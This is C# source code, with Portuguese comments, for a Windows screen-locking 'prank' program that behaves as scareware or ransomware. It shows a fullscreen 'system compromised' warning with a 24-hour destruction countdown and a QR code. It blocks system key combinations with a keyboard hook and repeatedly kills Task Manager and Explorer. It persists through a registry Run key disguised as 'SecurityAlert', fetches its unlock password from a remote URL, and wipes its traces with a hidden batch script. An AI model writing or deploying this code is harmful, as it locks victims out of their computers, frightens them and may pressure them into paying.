using System;
using System.Drawing;
using System.Windows.Forms;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Net;
using System.IO;
using Microsoft.Win32;

public class TrolagemHacker : Form
{
    private TextBox txtChave;
    private Button btnDesbloquear;
    private Label lblCronometro;
    private System.Windows.Forms.Timer timerProtecao;
    private System.Windows.Forms.Timer timerRelogio;
    private DateTime tempoFinal;
    
    private const string SENHA_MESTRA = "nakaxima123";
    private const string URL_SENHA = "https://raw.githubusercontent.com/espertin/wind/main/trolagem";
    private const string URL_HACKER = "https://i.ibb.co/NgkJFxH8/ASA.png";
    private const string URL_QRCODE = "https://raw.githubusercontent.com/espertin/wind/main/QR.png";

    // --- HOOK DE TECLADO (BLOQUEIO DE WIN, ALT+TAB, ETC) ---
    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);
    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    private static IntPtr _hookID = IntPtr.Zero;
    private static LowLevelKeyboardProc _proc = HookCallback;

    public TrolagemHacker()
    {
        this.BackColor = Color.Black;
        this.FormBorderStyle = FormBorderStyle.None;
        this.WindowState = FormWindowState.Maximized;
        this.TopMost = true;
        this.ShowInTaskbar = false;

        int screenWidth = Screen.PrimaryScreen.Bounds.Width;
        int screenHeight = Screen.PrimaryScreen.Bounds.Height;

        // --- CRONÔMETRO ---
        tempoFinal = DateTime.Now.AddHours(24);
        lblCronometro = new Label();
        lblCronometro.ForeColor = Color.Lime;
        lblCronometro.Font = new Font("Courier New", 30, FontStyle.Bold);
        lblCronometro.Size = new Size(screenWidth, 60);
        lblCronometro.TextAlign = ContentAlignment.MiddleCenter;
        lblCronometro.Location = new Point(0, screenHeight - 150);
        this.Controls.Add(lblCronometro);

        timerRelogio = new System.Windows.Forms.Timer();
        timerRelogio.Interval = 1000;
        timerRelogio.Tick += (s, e) => AtualizarCronometro();
        timerRelogio.Start();

        // --- TÍTULO ---
        Label lblTitulo = new Label();
        lblTitulo.Text = "SISTEMA COMPROMETIDO";
        lblTitulo.ForeColor = Color.Red;
        lblTitulo.Font = new Font("Courier New", 36, FontStyle.Bold);
        lblTitulo.AutoSize = true;
        lblTitulo.Location = new Point((screenWidth - 600) / 2, 320);
        this.Controls.Add(lblTitulo);

        // --- TEXTO ---
        Label lblTexto = new Label();
        lblTexto.Text = "Ola, irmao. Seu computador foi bloqueado!\n\n" +
                        "AVISO: NAO TENTE REINICIAR OU FECHAR ESTA JANELA.\n" +
                        "A SENHA E ATUALIZADA REMOTAMENTE.";
        lblTexto.ForeColor = Color.Lime;
        lblTexto.Font = new Font("Courier New", 12, FontStyle.Bold);
        lblTexto.TextAlign = ContentAlignment.MiddleCenter;
        lblTexto.Size = new Size(800, 100);
        lblTexto.Location = new Point((screenWidth - 800) / 2, 400);
        this.Controls.Add(lblTexto);

        // --- CAMPO SENHA ---
        txtChave = new TextBox();
        txtChave.PasswordChar = '*';
        txtChave.Font = new Font("Arial", 20);
        txtChave.TextAlign = HorizontalAlignment.Center;
        txtChave.Size = new Size(250, 40);
        txtChave.Location = new Point((screenWidth - 250) / 2, 680);
        this.Controls.Add(txtChave);

        btnDesbloquear = new Button();
        btnDesbloquear.Text = "DESBLOQUEAR";
        btnDesbloquear.BackColor = Color.Lime;
        btnDesbloquear.FlatStyle = FlatStyle.Flat;
        btnDesbloquear.Font = new Font("Arial", 12, FontStyle.Bold);
        btnDesbloquear.Size = new Size(250, 50);
        btnDesbloquear.Location = new Point((screenWidth - 250) / 2, 730);
        btnDesbloquear.Click += (s, e) => VerificarChave();
        this.Controls.Add(btnDesbloquear);

        // --- IMAGENS ---
        using (WebClient client = new WebClient()) {
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
            try {
                byte[] imgData = client.DownloadData(URL_HACKER);
                PictureBox pbHacker = new PictureBox();
                using (var ms = new MemoryStream(imgData)) { pbHacker.Image = Image.FromStream(ms); }
                pbHacker.SizeMode = PictureBoxSizeMode.Zoom;
                pbHacker.Size = new Size(250, 250);
                pbHacker.Location = new Point((screenWidth - 250) / 2, 50);
                this.Controls.Add(pbHacker);
            } catch {}
            try {
                byte[] qrData = client.DownloadData(URL_QRCODE);
                PictureBox pbQR = new PictureBox();
                using (var ms = new MemoryStream(qrData)) { pbQR.Image = Image.FromStream(ms); }
                pbQR.SizeMode = PictureBoxSizeMode.Zoom;
                pbQR.Size = new Size(150, 150);
                pbQR.Location = new Point((screenWidth - 150) / 2, 510);
                this.Controls.Add(pbQR);
            } catch {}
        }

        // --- PERSISTÊNCIA ---
        try {
            string exePath = Application.ExecutablePath;
            // Adiciona no Registro (Run)
            RegistryKey rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            rk.SetValue("SecurityAlert", exePath);
        } catch {}

        // --- PROTEÇÃO ---
        timerProtecao = new System.Windows.Forms.Timer();
        timerProtecao.Interval = 1000;
        timerProtecao.Tick += (s, e) => {
            foreach (var p in Process.GetProcessesByName("taskmgr")) try { p.Kill(); } catch {}
            foreach (var p in Process.GetProcessesByName("explorer")) try { p.Kill(); } catch {}
            this.Activate();
        };
        timerProtecao.Start();

        _hookID = SetHook(_proc);
    }

    private void AtualizarCronometro() {
        TimeSpan resta = tempoFinal - DateTime.Now;
        if (resta.TotalSeconds <= 0) {
            lblCronometro.Text = "TEMPO ESGOTADO - SISTEMA DESTRUIDO";
            lblCronometro.ForeColor = Color.Red;
        } else {
            lblCronometro.Text = string.Format("{0:D2}:{1:D2}:{2:D2}", resta.Hours, resta.Minutes, resta.Seconds);
        }
    }

    private void VerificarChave() {
        string senhaGitHub = "";
        try {
            using (WebClient client = new WebClient()) {
                senhaGitHub = client.DownloadString(URL_SENHA).Trim();
            }
        } catch {}

        if (txtChave.Text == SENHA_MESTRA || (!string.IsNullOrEmpty(senhaGitHub) && txtChave.Text == senhaGitHub)) {
            UnhookWindowsHookEx(_hookID);
            timerProtecao.Stop();
            Process.Start("explorer.exe");
            
            // --- LIMPEZA DE RASTROS E AUTODESTRUIÇÃO ---
            try {
                // Remove do registro
                RegistryKey rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                rk.DeleteValue("SecurityAlert", false);
                
                // Apaga arquivos temporários e inicia script de autodestruição
                string exePath = Application.ExecutablePath;
                string batPath = Path.Combine(Path.GetTempPath(), "cleanup.bat");
                
                // Cria um script batch que espera o programa fechar e apaga TUDO
                string cleanupScript = "@echo off\n" +
                                       "timeout /t 2 /nobreak > nul\n" +
                                       "del /f /q \"" + exePath + "\"\n" +
                                       "del /f /q \"" + Path.Combine(Path.GetTempPath(), "TrolagemHacker.cs") + "\"\n" +
                                       "del /f /q \"" + Path.Combine(Path.GetTempPath(), "AUTORUN_TROLAGEM_GHOST.bat") + "\"\n" +
                                       "del /f /q \"%~f0\"\n" +
                                       "exit";
                File.WriteAllText(batPath, cleanupScript);
                
                ProcessStartInfo psi = new ProcessStartInfo();
                psi.FileName = "cmd.exe";
                psi.Arguments = "/c \"" + batPath + "\"";
                psi.WindowStyle = ProcessWindowStyle.Hidden;
                Process.Start(psi);
            } catch {}

            MessageBox.Show("SISTEMA RESTAURADO COM SUCESSO!", "DESBLOQUEADO", MessageBoxButtons.OK, MessageBoxIcon.Information);
            Application.Exit();
        } else {
            MessageBox.Show("CHAVE INCORRETA!", "ERRO", MessageBoxButtons.OK, MessageBoxIcon.Error);
            txtChave.Clear();
        }
    }

    // --- LÓGICA DO HOOK DE TECLADO ---
    private static IntPtr SetHook(LowLevelKeyboardProc proc) {
        using (Process curProcess = Process.GetCurrentProcess())
        using (ProcessModule curModule = curProcess.MainModule) {
            return SetWindowsHookEx(13, proc, GetModuleHandle(curModule.ModuleName), 0);
        }
    }

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
        if (nCode >= 0) {
            int vkCode = Marshal.ReadInt32(lParam);
            Keys key = (Keys)vkCode;
            if (key == Keys.LWin || key == Keys.RWin || 
               (key == Keys.Tab && Control.ModifierKeys == Keys.Alt) ||
               (key == Keys.Escape && Control.ModifierKeys == Keys.Control) ||
               (key == Keys.F4 && Control.ModifierKeys == Keys.Alt)) {
                return (IntPtr)1;
            }
        }
        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }

    [STAThread]
    public static void Main() {
        Application.EnableVisualStyles();
        Application.Run(new TrolagemHacker());
    }
}
